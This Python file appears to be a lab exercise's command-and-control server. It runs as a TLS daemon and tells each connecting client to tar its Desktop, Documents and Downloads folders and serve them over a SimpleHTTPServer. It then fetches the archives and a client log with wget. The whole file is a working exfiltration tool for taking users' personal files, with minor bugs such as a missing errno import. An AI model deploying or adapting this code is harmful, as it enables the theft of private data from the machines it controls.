#!/usr/bin/env python3

import argparse
import os
import signal
import socket
import logzero
from logzero import logger
import sys
import ssl
import time

def daemonize(pidFile, *, stdin='/dev/null', stdout='/dev/null', 
        stderr='/dev/null'):
    if os.path.exists(pidFile):
        raise RuntimeError("Already running")

    try:
        if os.fork() >0:
            raise SystemExit(0)
    except OSError:
        raise RuntimeError("Fork #1 failed.")

    os.chdir("/home/lab")
    #Kept the home directory for daemon as lab for file downloads
    os.umask(0)
    os.setsid()

    with open(stdin, "rb", 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(stdout, "ab", 0) as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(stderr, "ab", 0) as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    with open(pidFile, "w") as f:
        print(os.getpid(), file=f)

    os.setuid(1000) #1 is the uid for lab in /etc/passwd
    os.setgid(1000) #1 is also the gid for lab in /etc/passwd


def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
            print(f"Child {pid} terminated with status {status}\n")
        except OSError:
            return

        if pid == 0:
            return

def socketServer(port, host):
    try:
        socketListener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        serverSocketAddress = (host, port)
        socketListener.bind(serverSocketAddress)
        socketListener.listen(5)

    except socket.error:
        logger.info(f"Socket error: {socket.error}")
        socketListener.close()
    
    secureContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    secureContext.load_cert_chain('/home/lab/Documents/ca.chain-bundle.cert.pem','/home/lab/Documents/daemon.key')
    secureSocketListener = secureContext.wrap_socket(socketListener, server_side=True)

    signal.signal(signal.SIGCHLD, signalHandler)

    print(f"Waiting for connection on host: {host} & port: {port}")

    while True:
        socketConnection, clientAddress = secureSocketListener.accept()
        print(f"Connected to {clientAddress}\n")

        try:
            pid = os.fork()
        except OSError as err:
            code, msg = err.args
            if code == errno.EINTR:
                print("Restarting interupted forking!")
                continue
            else:
                print("Something went wrong!")
                raise
        
        if pid == 0:                #Child
            socketListener.close()
            requestHandler(socketConnection, clientAddress)
            print("Connection Closed!")
            socketConnection.close()
            os._exit(0)
        else:                       #Parent
            print(f"Parent is dead\n {os.getpid()} is logging")
            socketConnection.close()

def requestHandler(socketConnection, clientAddress):
    targetAddress = str(clientAddress[0])
    print(targetAddress)

    formResults = str(socketConnection.recv(1024), "utf-8")
    print(formResults)
    commandList = [
        "tar -zcvf Desktop.tar.gz Desktop",
        "tar -zcvf Documents.tar.gz Documents",
        "tar -zcvf Downloads.tar.gz Downloads",
        "python -m SimpleHTTPServer 9999"]

    for i in commandList:
        socketConnection.send(i.encode("utf-8"))
        if i == "python -m SimpleHTTPServer 9999":
            time.sleep(1)
            print("Downloading files from HTTP Server")
            os.popen(f"wget {targetAddress}:9999/Documents.tar.gz")
            os.popen(f"wget {targetAddress}:9999/Downloads.tar.gz")
            os.popen(f"wget {targetAddress}:9999/Desktop.tar.gz")
            os.popen(f"wget {targetAddress}:9999/clientdaemon.log")

        commandOutput = str(socketConnection.recv(1024), "utf-8")
        print(commandOutput)

    print("Connection Closed!")
    socketConnection.close()

if __name__ == "__main__":
    logzero.logfile("/home/lab/daemon.log", maxBytes=1e6, 
            backupCount=3, disableStderrLogger=True)
    logger.info(f"Started {os.getpid()}")

    pidFile = "/tmp/daemon.pid"

    switchParser = argparse.ArgumentParser(description = "Arguments to \
start daemon server")
    switchParser.add_argument("run", metavar="RUN", type=str,
            help="This daemon accepts any of these value: 'start', \
'stop'", 
    choices=["start", "stop"])

    switchArgs = switchParser.parse_args()
    
    if switchArgs.run == "start":
        daemonize(pidFile, stdout="/home/lab/daemon.log", 
                stderr="/home/lab/daemon.log")

        ipAddress = "192.168.60.156" #Enter the server IP address
        port = 9999
        socketServer(port, ipAddress)

    elif switchArgs.run == "stop":
        if os.path.exists(pidFile):
            logger.info("Stopping Daemon")
            with open(pidFile) as f:
                os.kill(int(f.read()), signal.SIGTERM)
                os.remove(pidFile)
                raise SystemExit(1)
        else: 
            logger.info(f"Daemon not running")
            raise SystemExit(1)
    else:
        logger.info("Command does not exist")
        raise SystemExit(1)

